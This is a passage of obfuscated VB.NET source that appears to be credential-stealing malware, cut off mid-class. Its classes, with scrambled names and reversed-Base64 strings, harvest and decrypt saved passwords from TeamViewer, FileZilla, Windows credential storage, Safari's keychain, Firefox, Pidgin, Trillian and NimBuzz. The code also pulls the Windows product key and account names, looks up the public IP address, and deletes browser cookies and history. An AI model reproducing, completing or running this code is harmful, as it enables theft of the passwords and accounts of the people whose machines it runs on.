                        Dim L As New daeepskwpsk(Sk.Revpep("YWxsaXplbGlG"), Server, Acc, Pass)
                        If Not AllA.Contains(L) AndAlso Isaekep(L) Then AllA.Add(L)
                    End If

                Next
            End If
            Return AllA
        End Function
    End Class
    Class tekkpsmee
        Private Delegate Function EnumWindowsProc(hWnd As IntPtr, lParam As IntPtr) As Boolean
        <DllImport("User32.Dll", CharSet:=System.Runtime.InteropServices.CharSet.Auto)> Private Shared Function EnumChildWindows(hWndParent As IntPtr, lpEnumFunc As EnumWindowsProc, lParam As Integer) As Boolean
        End Function
        <DllImport("User32.Dll")> Private Shared Function SendMessage(hWnd As IntPtr, Msg As UInt32, wParam As IntPtr, lParam As String) As IntPtr
        End Function
        <DllImport("User32.Dll")> Private Shared Function SendMessage(hWnd As IntPtr, Msg As Integer, wParam As Integer, lParam As System.Text.StringBuilder) As Integer
        End Function
        <DllImport("User32.Dll")> Private Shared Function GetWindowThreadProcessId(hWnd As IntPtr, ByRef lpdwProcessId As IntPtr) As Integer
        End Function
        <DllImport("User32.Dll")> Private Shared Function EnumWindows(IpEnumFunc As EnumWindowsProc, lParam As IntPtr) As Boolean
        End Function
        <DllImport("User32.Dll")> Private Shared Function GetWindowProcessID(windowHandle As IntPtr) As IntPtr
        End Function
        Private Function GetText(W As IntPtr) As String
            Dim Len As Integer = SendMessage(W, &HE, 0, Nothing)
            Dim T As System.Text.StringBuilder = New StringBuilder(Len + 1)
            SendMessage(W, &HD, Len + 1, T)
            Return T.ToString
        End Function
        Private Function EnumChilds(hwnd As IntPtr) As List(Of IntPtr)
            Dim Childs As New List(Of IntPtr)
            EnumChildWindows(hwnd, Function(h, arg)
                                       Childs.Add(h)
                                       Return True
                                   End Function, 0)
            Return Childs
        End Function
        Private Function EnumWindowz() As List(Of IntPtr)
            Dim Windowz As New List(Of IntPtr)
            EnumWindows(Function(h, args)
                            Windowz.Add(h)
                            Return True
                        End Function, CType(0, IntPtr))
            Return Windowz
        End Function
        Private Function GetProcessIdFromWindow(WindowHandle As IntPtr) As IntPtr
            Dim ProcessId As IntPtr = IntPtr.Zero
            GetWindowThreadProcessId(WindowHandle, ProcessId)
            Return ProcessId
        End Function
        Private Function GetProcessWindows(ProcessId As Integer) As List(Of IntPtr)
            Return EnumWindowz().Where(Function(e) GetProcessIdFromWindow(e) = CType(ProcessId, IntPtr)).ToList
        End Function
        Public Function ReadData() As daeepskwpsk
            Dim processes As Process() = Process.GetProcesses.OfType(Of Process).Where(Function(de) de.MainWindowTitle.ToLower.StartsWith(Sk.Revpep("cmV3ZWl2bWFldA=="))).ToArray
            If processes.Length = 0 Then Return New daeepskwpsk(String.Empty, String.Empty, String.Empty, String.Empty)

            Dim pp As IntPtr() = processes.SelectMany(Function(d) GetProcessWindows(d.Id)).ToArray
            Dim childz As IntPtr() = pp.SelectMany(Function(w) EnumChilds(w)).ToArray

            For i As Integer = 0 To childz.Count - 1
                If Regex.IsMatch(GetText(childz(i)), "([ \d]{11})") Then
                    Dim Pass As String = GetText(childz(i + 3))
                    If GetText(childz(i + 1)).Length > Pass.Length Then Pass = GetText(childz(i + 1))
                    Dim L As New daeepskwpsk(Sk.Revpep("cmV3ZWlWbWFlVA=="), String.Empty, GetText(childz(i)), Pass)
                    If L.ac.Length > 0 AndAlso L.pa.Length > 0 Then Return L
                End If
            Next
            Return New daeepskwpsk(String.Empty, String.Empty, String.Empty, String.Empty)
        End Function
    End Class
    Class mseuizr
        <DllImport("Advapi32.Dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Unicode)> Private Shared Function CredEnumerateW(Filter As String, Flags As Integer, ByRef Count As Integer, ByRef pCredentials As IntPtr) As Boolean
        End Function
        <DllImport("Crypt32.Dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> Private Shared Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, szDataDescr As String, pOptionalEntropy As Integer, pvReserved As IntPtr, pPromptStruct As IntPtr, dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
        End Function
        Private Structure Credential
            <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)> Public TargetName, Comment As String
            Public LastWritten As Long
            Public CredentialBlobSize, CredentialBlob, Persist, AttributeCount, Flags, Type As Integer
            Public Attributes As IntPtr
            <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)> Public TargetAlias, UserName As String
        End Structure
        Private Structure DATA_BLOB
            Public cbData, pbData As Integer
        End Structure
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim AllA As New List(Of daeepskwpsk)
            Dim DataIn, DataOut As DATA_BLOB
            Dim L As IntPtr = IntPtr.Zero
            Dim D As Integer = 0
            Dim B As New List(Of String)
            CredEnumerateW(Sk.Revpep("Kj1lbWFuOmV2aUxzd29kbmlX"), 0, D, L)
            For i As Integer = 0 To D - 1
                Dim Cred As Credential = CType(System.Runtime.InteropServices.Marshal.PtrToStructure(CType(System.Runtime.InteropServices.Marshal.ReadIntPtr(L, i * 4), IntPtr), GetType(Credential)), Credential)
                DataIn.pbData = Cred.CredentialBlob
                DataIn.cbData = Cred.CredentialBlobSize
                CryptUnprotectData(DataIn, Nothing, 0, IntPtr.Zero, IntPtr.Zero, 1, DataOut)
                DataOut.pbData = DataIn.pbData

                Dim LL As New daeepskwpsk(Sk.Revpep("TlNN"), String.Empty, Cred.UserName, CStr((System.Runtime.InteropServices.Marshal.PtrToStringBSTR(New IntPtr(DataOut.pbData)))))
                If Not AllA.Contains(LL) AndAlso Isaekep(LL) Then AllA.Add(LL)
            Next
            Return AllA
        End Function
    End Class
    Class saejejrpeiwr

        Private Function DecryptPassword(decodedB64 As Byte()) As String
            Dim DataIn, DataOut, OptionalEntropy As DATA_BLOB

            Dim Salt As Byte() = {&H1D, &HAC, &HA8, &HF8, &HD3, &HB8, &H48, &H3E, &H48, &H7D, &H3E, &HA,
            &H62, &H7, &HDD, &H26, &HE6, &H67, &H81, &H3, &HE7, &HB2, &H13, &HA5, &HB0, &H79, &HEE, &H4F, &HF, &H41,
            &H15, &HED, &H7B, &H14, &H8C, &HE5, &H4B, &H46, &HD, &HC1, &H8E, &HFE, &HD6, &HE7, &H27, &H75, &H6, &H8B,
            &H49, &H0, &HDC, &HF, &H30, &HA0, &H9E, &HFD, &H9, &H85, &HF1, &HC8, &HAA, &H75, &HC1, &H8, &H5, &H79,
            &H1, &HE2, &H97, &HD8, &HAF, &H80, &H38, &H60, &HB, &H71, &HE, &H68, &H53, &H77, &H2F, &HF, &H61, &HF6,
            &H1D, &H8E, &H8F, &H5C, &HB2, &H3D, &H21, &H74, &H40, &H4B, &HB5, &H6, &H6E, &HAB, &H7A, &HBD, &H8B, &HA9,
            &H7E, &H32, &H8F, &H6E, &H6, &H24, &HD9, &H29, &HA4, &HA5, &HBE, &H26, &H23, &HFD, &HEE, &HF1, &H4C, &HF,
            &H74, &H5E, &H58, &HFB, &H91, &H74, &HEF, &H91, &H63, &H6F, &H6D, &H2E, &H61, &H70, &H70, &H6C, &H65, &H2E,
            &H53, &H61, &H66, &H61, &H72, &H69}

            Dim passPtr As IntPtr = Marshal.AllocHGlobal(decodedB64.Length + 4)
            Marshal.Copy(decodedB64, 0, passPtr, decodedB64.Length)

            DataIn.cbData = decodedB64.Length
            DataIn.pbData = passPtr

            Dim Ghandle As GCHandle = GCHandle.Alloc(Salt, GCHandleType.Pinned)

            OptionalEntropy.cbData = Salt.Length
            OptionalEntropy.pbData = Ghandle.AddrOfPinnedObject()
            Ghandle.Free()

            If CryptUnprotectData(DataIn, Nothing, OptionalEntropy, IntPtr.Zero, Nothing, 0, DataOut) = False Then Return String.Empty

            Marshal.FreeHGlobal(passPtr)

            Dim PasswordLength As Integer = Marshal.ReadInt32(DataOut.pbData)
            Dim decryptedData As Byte() = New Byte(PasswordLength - 1) {}

            DataOut.pbData = New IntPtr(DataOut.pbData.ToInt32() + 4)
            Marshal.Copy(DataOut.pbData, decryptedData, 0, PasswordLength)

            LocalFree(DataOut.pbData)

            Return Encoding.Default.GetString(decryptedData)
        End Function
        Public Function ReadData() As List(Of daeepskwpsk)

            Dim AllA As New List(Of daeepskwpsk)

            Dim KC As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("dHNpbHAubmlhaGN5ZWtcc2VjbmVyZWZlclBccmV0dXBtb0MgZWxwcEE="))
            Dim Plutil As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), Sk.Revpep("ZXhlLmxpdHVscFx0cm9wcHVTIG5vaXRhY2lscHBBIGVscHBBXGVscHBBXHNlbGlGIG5vbW1vQw=="))


            If Not File.Exists(KC) Then Return AllA

            If Not File.Exists(Plutil) Then
                Plutil = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), Sk.Revpep("ZXhlLmxpdHVscFx0cm9wcHVTIG5vaXRhY2lscHBBIGVscHBBXGlyYWZhUw=="))
                If Not File.Exists(Plutil) Then Return AllA
            End If

            Dim xmlPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("bG14Lm5pYWhjeWVr"))
            If File.Exists(xmlPath) Then File.Delete(xmlPath)


            Dim Dst As Func(Of Boolean) = Function()
                                              Dim ok As Boolean = False
                                              Try
                                                  Dim z As String = System.Convert.ToChar(34)
                                                  Dim Proc As Process = New Process()
                                                  Proc.StartInfo.FileName = Plutil
                                                  Proc.StartInfo.Arguments = String.Concat("-convert xml1 -s -o ", z, xmlPath, z, " ", z, KC, z)
                                                  Proc.StartInfo.UseShellExecute = True
                                                  Proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                                                  ok = Proc.Start()
                                              Catch
                                              End Try
                                              Return ok
                                          End Function

            While True
                Dst()
                While Process.GetProcessesByName(Sk.Revpep("bGl0dWxw")).Count > 0
                End While
                If File.Exists(xmlPath) Then Exit While
            End While


            Dim contents As String = ReadAsString(xmlPath, Encoding.Default)


            If contents.Length = 0 Then Return AllA
            If Not (contents.Contains("<array>") AndAlso contents.Contains("<dict>")) Then
                Return AllA
            End If
            Dim Bs As String() = InlineAssignHelper(New String() {}, Regex.Split(Regex.Split(contents, "<array>")(1), "<dict>"))
            For Each p As String In Bs
                If p.Length > 10 Then
                    Dim ks As String() = p.Split(Convert.ToChar(10)).Where(Function(wx) wx.Length > 2).ToArray


                    Dim urlind As Integer = ks.ToList.FindIndex(Function(w) w.Contains("Server</key>")) + 1
                    Dim accind As Integer = ks.ToList.FindIndex(Function(w) w.Contains("Account</key>")) + 1


                    Dim Url As String = Regex.Match(ks(urlind), "<String>(.+?)</String").Groups(1).Value
                    Dim Acc As String = Regex.Match(ks(accind), "<String>(.+?)</String").Groups(1).Value
                    Acc = System.Web.HttpUtility.HtmlDecode(Acc)


                    Dim Pass As String = String.Join(String.Empty, ks.SkipWhile(Function(dx) Not dx.Contains("<data>")).Skip(1).TakeWhile(Function(wx) Not wx.Contains("</data>")).Select(Function(e) e.ToString).ToArray)
                    Pass = DecryptPassword(Convert.FromBase64String(Pass))


                    Dim L As New daeepskwpsk(Sk.Revpep("aXJhZmFT"), Url, Acc, Pass)
                    If Not AllA.Contains(L) AndAlso Isaekep(L) Then AllA.Add(L)
                End If
            Next
            Return AllA
        End Function
        Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
            target = value
            Return value
        End Function
    End Class
    'Class IEXplorerDecrypt
    '        <PropertyGroup>
    '    <TargetPlatformVersion>8.0</TargetPlatformVersion>
    '</PropertyGroup>
    '    Public Function ReadData() As List(Of daeepskwpsk)
    '        Dim AllA As New List(Of daeepskwpsk)
    '        Dim vault As New PasswordVault
    '        Dim b As IReadOnlyList(Of PasswordCredential) = vault.RetrieveAll()
    '        For i As Integer = 0 To b.Count - 1
    '            Dim cred As PasswordCredential = b.ElementAt(i)
    '            cred.RetrievePassword()
    '            Dim L As New daeepskwpsk(Sk.Revpep("cmVyb2xweEUgdGVucmV0bkk="), cred.resource, cred.username, cred.password)
    '            If Not AllA.Contains(L) AndAlso Isaekep(L) Then AllA.Add(L)
    '        Next
    '        Return AllA
    '    End Function
    'End Class
    Class pisgez
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim AllA As New List(Of daeepskwpsk)
            Dim Pat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("bG14LnN0bnVvY2NhXGVscHJ1cC4="))
            If File.Exists(Pat) Then
                Dim T As String = ReadAsString(Pat, Encoding.Default)
                AllA.AddRange((From n In Regex.Matches(T, "name>(.+?)</name>\s+<password>(.+?)</password").OfType(Of Match)().Distinct Select New daeepskwpsk(Sk.Revpep("bmlnZGlQ"), String.Empty, n.Groups(1).Value, n.Groups(2).Value)).ToArray)
            End If
            Return AllA
        End Function
    End Class
    Class wkwuerzrswp

        'Works
        Public Function ReadData() As daeepskwpsk
            Dim SubK As RegistryKey = Nothing

            Try
                If Environment.Is64BitOperatingSystem Then
                    Using Bk As RegistryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64)
                        SubK = Bk.OpenSubKey(Sk.Revpep("bm9pc3JlVnRuZXJydUNcVE4gc3dvZG5pV1x0Zm9zb3JjaU1cRVJBV1RGT1M="), RegistryKeyPermissionCheck.ReadSubTree)
                    End Using
                Else
                    SubK = Registry.LocalMachine.OpenSubKey(Sk.Revpep("bm9pc3JlVnRuZXJydUNcVE4gc3dvZG5pV1x0Zm9zb3JjaU1cRVJBV1RGT1M="), RegistryKeyPermissionCheck.ReadSubTree)
                End If
            Catch
            End Try
            If SubK Is Nothing Then Return New daeepskwpsk()

            Dim Dii As Byte() = DirectCast(SubK.GetValue(Sk.Revpep("ZEl0Y3Vkb3JQbGF0aWdpRA=="), New Byte(-1) {}), Byte())
            Dim kSt As Integer = 52
            Dim digits As Char() = "BCDFGHJKMPQRTVWXY2346789".ToCharArray
            Dim containsN As Integer = (Dii(kSt + 14) >> 3) And 1
            Dii(kSt + 14) = Convert.ToByte((Dii(kSt + 14) And &HF7) Or ((containsN And 2) << 2))


            Dim DecC As Char() = New Char(28) {}

            Dim hexPid As New List(Of Byte)

            For i As Integer = kSt To 67
                hexPid.Add(Dii(i))
            Next

            For i As Integer = 28 To 0 Step -1
                ' Every sixth char is a separator.
                If (i + 1) Mod 6 = 0 Then
                    DecC(i) = "-"c
                Else
                    ' Do the actual decoding.
                    Dim digitMapIndex As Integer = 0
                    For j As Integer = 14 To 0 Step -1
                        Dim byteValue As Integer = (digitMapIndex << 8) Or hexPid(j)
                        hexPid(j) = CByte(byteValue \ 24)
                        digitMapIndex = byteValue Mod 24
                        DecC(i) = digits(digitMapIndex)
                    Next
                End If
            Next
            If containsN <> 0 Then
                Dim FiLi As Integer = 0
                For index As Integer = 0 To 23
                    If Not DecC(0) <> digits(index) Then Exit For
                    FiLi = index
                Next
                Dim keyWithN As String = String.Join(String.Empty, DecC.Skip(1).Select(Function(d) d.ToString).ToArray).Replace("-", String.Empty)
                keyWithN = String.Concat(keyWithN.Substring(0, FiLi), "N", keyWithN.Remove(0, FiLi))
                keyWithN = String.Concat(keyWithN.Substring(0, 5), "-", keyWithN.Substring(5, 5), "-", keyWithN.Substring(10, 5), "-", keyWithN.Substring(15, 5), "-", keyWithN.Substring(20, 5))
                Return New daeepskwpsk With {.ap = Sk.Revpep("eWVLIHN3b2RuaVc="), .ur = String.Empty, .ac = Environment.UserName, .pa = keyWithN}
            End If
            Return New daeepskwpsk With {.ap = Sk.Revpep("eWVLIHN3b2RuaVc="), .ur = String.Empty, .ac = "-", .pa = String.Join(String.Empty, DecC)}
        End Function
    End Class
    Class ffkepdkeh
        Public Structure modke
            Public ProgramPath, ProfileBasePat, ProfilePath, LoginfilePath As String
            Public Sub New(ProgramP As String, ProfileB As String, ProfileP As String, LoginFileP As String)
                ProgramPath = ProgramP
                ProfileBasePat = ProfileB
                ProfilePath = ProfileP
                LoginfilePath = LoginFileP
            End Sub
        End Structure
        Public Function GetProfiles() As List(Of modke)
            Dim Alla As New List(Of modke)

            Dim BasePat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("eG9mZXJpRlxhbGxpem9N"))
            Console.WriteLine("Firefox: ", BasePat)

            Dim T As String = ReadAsString(Path.Combine(BasePat, Sk.Revpep("aW5pLnNlbGlmb3Jw")), Encoding.Default)

            Dim Profilez As String() = Regex.Matches(T, "Path=([^\s]+)").OfType(Of Match).Distinct.Select(Function(d) d.Groups(1).Value.Replace("/", "\")).ToArray

            Dim Loginfilez As String() = Profilez.Select(Function(d) Path.Combine(BasePat, String.Concat(d, Sk.Revpep("bm9zai5zbmlnb2xc"))).Replace("/", "\")).ToArray
            If Loginfilez.Count = 0 Then Return Alla

            Dim Ppat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), Sk.Revpep("eG9mZXJpRiBhbGxpem9N"))

            Alla.AddRange(Loginfilez.Select(Function(x) New modke(Ppat, BasePat, Path.Combine(BasePat, x).Replace("/", "\").Replace(Sk.Revpep("bm9zai5zbmlnb2xc"), String.Empty), x)).ToArray)

            Return Alla
        End Function


#Region "Dec"

        Private TSec As New TSECItem
        Private Se As New StringBuilder
        Private NSS3 As IntPtr = IntPtr.Zero
        Public Function ReadData() As List(Of daeepskwpsk)

            Dim Decrypt As Func(Of String, String) = Function(x As String)
                                                         Se.Clear()
                                                         Se.Append(x)

                                                         Dim item As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(BForDec(IntPtr.Zero, IntPtr.Zero, Se, Se.Length)), GetType(TSECItem)), TSECItem)

                                                         If PDec(item, TSec, 0) = 0 AndAlso TSec.SECItemLen <> 0 Then
                                                             Dim bvRet As Byte() = New Byte(TSec.SECItemLen - 1) {}
                                                             Marshal.Copy(New IntPtr(TSec.SECItemData), bvRet, 0, TSec.SECItemLen)
                                                             Return Encoding.ASCII.GetString(bvRet)
                                                         End If
                                                         Return String.Empty
                                                     End Function

            Dim Alla As New List(Of daeepskwpsk)
            Dim k As List(Of modke) = GetProfiles()

            If k.Count > 0 Then
                k.ForEach(Sub(z)

                              If File.Exists(z.LoginfilePath) Then
                                  neekeiniheeh(z)
                                  PAuth(PIntKsl(), True, 0)

                                  Dim T As String = ReadAsString(z.LoginfilePath, Encoding.Default)
                                  For Each p As Match In Regex.Matches(T, "formSubmitURL"":""([^""]+)"",[^,]+,[^,]+,""encryptedUsername"":""([^""]+)"",""encryptedPassword"":""([^""]+)").OfType(Of Match).Distinct
                                      Dim Host As String = p.Groups(1).Value
                                      Dim Acc As String = Decrypt(p.Groups(2).Value)
                                      Dim Pass As String = Decrypt(p.Groups(3).Value)
                                      Dim L As New daeepskwpsk(Sk.Revpep("eG9mZXJpRg=="), Host, Acc, Pass)
                                      If Isaekep(L) Then Alla.Add(L)
                                  Next
                              End If
                          End Sub)

            End If



            Return Alla
        End Function

        <DllImport("Kernel32.Dll")> Private Shared Function LoadLibrary(dllFilePath As String) As IntPtr
        End Function
        <DllImport("Kernel32.Dll", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)> Private Shared Function GetProcAddress(hModule As IntPtr, procName As String) As IntPtr
        End Function
        <StructLayout(LayoutKind.Sequential)> Private Structure TSECItem
            Public SECItemType, SECItemData, SECItemLen As Integer
        End Structure
        <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Private Delegate Function DelA(configdir As String) As Long
        <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Private Delegate Function DelB() As Long
        <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Private Delegate Function DelC(slot As Long, loadCerts As Boolean, wincx As Long) As Long
        <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Private Delegate Function DelD(arenaOpt As IntPtr, outItemOpt As IntPtr, inStr As StringBuilder, inLen As Integer) As Integer
        <UnmanagedFunctionPointer(CallingConvention.Cdecl)> Private Delegate Function DelE(ByRef data As TSECItem, ByRef result As TSECItem, cx As Integer) As Integer
        Private Function neekeiniheeh(P As modke) As Long
            LoadLibrary(Path.Combine(P.ProgramPath, Sk.Revpep("bGxkLmV1bGd6b20=")))
            NSS3 = LoadLibrary(Path.Combine(P.ProgramPath, Sk.Revpep("bGxkLjNzc24=")))
            Dim pProc As IntPtr = GetProcAddress(NSS3, Sk.Revpep("dGluSV9TU04="))
            If pProc = IntPtr.Zero Then Return -1

            Dim dll As DelA = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DelA)), DelA)
            Return dll(P.ProfilePath)
        End Function
        Private Function PIntKsl() As Long
            Dim pProc As IntPtr = GetProcAddress(NSS3, Sk.Revpep("dG9sU3llS2xhbnJldG5JdGVHXzExS1A="))
            If pProc = IntPtr.Zero Then Return -1
            Dim dll As DelB = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DelB)), DelB)

            Return dll()
        End Function
        Private Function PAuth(slot As Long, loadCerts As Boolean, wincx As Long) As Long
            Dim pProc As IntPtr = GetProcAddress(NSS3, Sk.Revpep("ZXRhY2l0bmVodHVBXzExS1A="))
            If pProc = IntPtr.Zero Then Return -1
            Dim dll As DelC = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DelC)), DelC)
            Return dll(slot, loadCerts, wincx)
        End Function
        Private Function BForDec(arenaOpt As IntPtr, outItemOpt As IntPtr, inStr As StringBuilder, inLen As Integer) As Integer
            Dim pProc As IntPtr = GetProcAddress(NSS3, Sk.Revpep("cmVmZnVCZWRvY2VEXzQ2ZXNhQlNTTg=="))
            Dim dll As DelD = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DelD)), DelD)
            Return dll(arenaOpt, outItemOpt, inStr, inLen)
        End Function
        Private Function PDec(ByRef data As TSECItem, ByRef result As TSECItem, cx As Integer) As Integer
            Dim pProc As IntPtr = GetProcAddress(NSS3, Sk.Revpep("dHB5cmNlRF9SRFMxMUtQ"))
            Dim dll As DelE = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DelE)), DelE)
            Return dll(data, result, cx)
        End Function
#End Region
    End Class
    Class trkjoekdu
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim deee As Func(Of String, String) = Function(x As String)
                                                      Dim Mag As Byte() = {243, 38, 129, 196, 57, 134, 219, 146, 113, 163, 185, 230, 83, 122, 149, 124, 0, 0, 0, 0, 0, 0, 255, 0, 0, 128, 0, 0, 0, 128, 128, 0, 255, 0, 0, 0, 128, 0, 128, 0, 128, 128, 0, 0, 0, 128, 255, 0, 128, 0, 255, 0, 128, 128, 128, 0, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 114, 101, 115, 111, 108, 118, 101, 32, 72, 84, 84, 80, 32, 112, 114, 111, 120, 0}
                                                      Dim Password As String = String.Empty
                                                      Dim txt As String = Encoding.UTF8.GetString(Convert.FromBase64String(x))


                                                      For i As Integer = 1 To txt.Length - 1 Step 2
                                                          Dim j As Integer = i \ 2
                                                          Dim val As Integer = Convert.ToInt32(txt.Substring(i - 1, 2), 16)
                                                          Password &= Convert.ToChar(val Xor Mag(j)).ToString()
                                                      Next


                                                      Return Password
                                                  End Function

            Dim Pat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("aW5pLnN0bnVvY2NhXGxhYm9sZ1xzcmVzdVxuYWlsbGlyVA=="))
            If Not File.Exists(Pat) Then Return New List(Of daeepskwpsk)

            Dim T As String = ReadAsString(Pat, Encoding.Default)
            Dim Alla As New List(Of daeepskwpsk)
            Alla.AddRange((From n In Regex.Matches(T, "Account=([^\s+]+)\s+.+Name=[^\s]+\s+Password=([^\s]+)").OfType(Of Match)() Select New daeepskwpsk(Sk.Revpep("bmFpbGxpclQ="), String.Empty, n.Groups(1).Value, deee(n.Groups(2).Value))).Distinct.ToArray)

            Return Alla
        End Function
    End Class

    Class nimejdzek
        Public Function ReadData() As daeepskwpsk

            Using Bk As RegistryKey = RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Default)

                Dim s As SecurityIdentifier = DirectCast(New NTAccount(Environment.UserName).Translate(GetType(SecurityIdentifier)), SecurityIdentifier)
                Dim Sid As String = s.ToString()


                Dim SubK As RegistryKey = Bk.OpenSubKey(String.Concat(Sid, Sk.Revpep("bm9pdGFjaWxwcEFcdG5laWxDQ1Bcenp1Ym1pTlxlcmF3dGZvU1w=")), RegistryKeyPermissionCheck.ReadSubTree)

                If SubK Is Nothing Then Return New daeepskwpsk

                Dim Subks As String() = SubK.GetValueNames()
                If Not Subks.Contains(Sk.Revpep("ZW1hbnJlc1U=")) AndAlso Subks.Contains(Sk.Revpep("ZHJvd3NzYVA=")) Then Return New daeepskwpsk

                Dim Acc As String = SubK.GetValue(Sk.Revpep("ZW1hbnJlc1U=")).ToString



                Dim Pass As String = BitConverter.ToString(CType(SubK.GetValue(Sk.Revpep("ZHJvd3NzYVA="), RegistryValueKind.Binary), Byte()))
                If Regex.IsMatch(Pass, "[a-zA-Z\d]+-[a-zA-Z\d]+-[a-zA-Z\d]+") Then Pass = "---"

                SubK.Close()
                Return New daeepskwpsk(Sk.Revpep("enp1Ym1pTg=="), String.Empty, Acc, Pass)
            End Using

        End Function
    End Class


    Public Class littkkep
        Private Function gebalkelepdk() As daeepskwpsk
            Dim L As New daeepskwpsk(String.Empty, String.Empty, String.Empty, String.Empty)

            Dim Pat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), String.Concat(Sk.Revpep("dGVuLmVsdHRhQg=="), "\", Sk.Revpep("Z2lmbm9jLnRlbi5lbHR0YUI=")))
            If Not File.Exists(Pat) Then Return L
            Dim So As String = ReadAsString(Pat, Encoding.Default)
            Dim Acc As String = Regex.Match(So, "SavedAccountNames"": ""([^""]+)").Groups(1).Value
            L.ap = Sk.Revpep("dG51b2NjQSB0ZU4uZWx0dGFC")
            L.ac = Acc
            L.pa = "-"
            Return L
        End Function
        Private Function gewidkwp() As daeepskwpsk
            Return New daeepskwpsk(Sk.Revpep("ZW1hbnJlc1Ugc3dvZG5pVw=="), String.Empty, Environment.UserName, "-")
        End Function
        Private Function geskyeuheo() As daeepskwpsk
            Dim L As New daeepskwpsk(String.Empty, String.Empty, String.Empty, String.Empty)
            Dim Pat As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("ZXB5a1M="))
            If Not Directory.Exists(Pat) Then Return L

            Dim Dirs As FileInfo() = Directory.GetDirectories(Pat).Select(Function(w) New FileInfo(w)).ToArray
            For Each x As FileInfo In Dirs
                Dim z As String() = Directory.GetFiles(x.FullName).Select(Function(e) Path.GetFileName(e)).ToArray
                If z.Contains(Sk.Revpep("YmQubGF2eWVr")) Then L.ac = x.Name
            Next
            L.ap = Sk.Revpep("ZW1hbnJlc1UgZWVweWtT")
            L.pa = "-"
            Return L
        End Function

        Private Function gesoeieo() As daeepskwpsk
            Using Wc As New WebClient
                Wc.Proxy = Nothing
                Dim T As String = Wc.DownloadString("http://www.speedtest.net/de/")
                File.WriteAllText("halloee.txt", T)
                T = Regex.Match(T, "lautet:.+\s+[^\d]+([^<]+)").Groups(1).Value
                Return New daeepskwpsk(Sk.Revpep("c3NlcmRkQSBQSQ=="), "-", T, "-")
            End Using
        End Function
        Public Function ReadData() As List(Of daeepskwpsk)
            Dim AllA As New List(Of daeepskwpsk)

            AllA.Add(gewidkwp)
            AllA.Add(geskyeuheo)
            AllA.Add(gebalkelepdk)
            AllA.Add(gesoeieo)
            Return AllA
        End Function
    End Class

    Public Class Clea
        'Single
        Private Sub Clsajfj()
            Dim BaseP As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("cmV0dXBtb0MgZWxwcEE="), Sk.Revpep("aXJhZmFT"))
            If Not Directory.Exists(BaseP) Then Exit Sub

            Dim Cook As String = Path.Combine(BaseP, Sk.Revpep("c2Vpa29vQw=="))
            If Directory.Exists(Cook) Then Directory.Delete(Cook, True)

            Dim fiz As String() = {"dHNpbHAubm9pc3NlU3RzYUw=", "dHNpbHAueXJvdHNpSA=="}
            fiz.ToList.ForEach(Sub(w)
                                   Dim tm As String = Path.Combine(BaseP, Sk.Revpep(w))
                                   If File.Exists(tm) Then File.Delete(tm)
                               End Sub)
        End Sub

        Private Sub Cloejdke()
            Dim BaseP As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Sk.Revpep("ZXJhd3Rmb1MgYXJlcE8="), Sk.Revpep("ZWxiYXRTIGFyZXBP"))
            If Not Directory.Exists(BaseP) Then Exit Sub

            Dim fiz As String() = {"c2Vpa29vQw==", "eXJvdHNpSA==", "YXRhRCBiZVc="}
            fiz.ToList.ForEach(Sub(w)
                                   Dim tm As String = Path.Combine(BaseP, Sk.Revpep(w))
                                   If File.Exists(tm) Then File.Delete(tm)
                               End Sub)
        End Sub

        Private Sub ClChroandChroe()
            Dim e As New chroachroejeiep
            Dim t As String() = e.GetProfiles(chroachroejeiep.brkw.gchr).ToArray
            t = t.Union(e.GetProfiles(chroachroejeiep.brkw.chroep)).ToArray

            If t.Count = 0 Then Exit Sub

            Dim r As String() = {"c2Vpa29vQw==", "YXRhRCBiZVc=", "eXJvdHNpSA=="}
            t.ToList.ForEach(Sub(rr)
                                 r.ToList.ForEach(Sub(ww)
                                                      Dim tem As String = Path.Combine(rr, Sk.Revpep(ww))
                                                      If File.Exists(tem) Then File.Delete(tem)
                                                  End Sub)
                             End Sub)

        End Sub

        Private Sub Clff()
            Dim rew As New ffkepdkeh
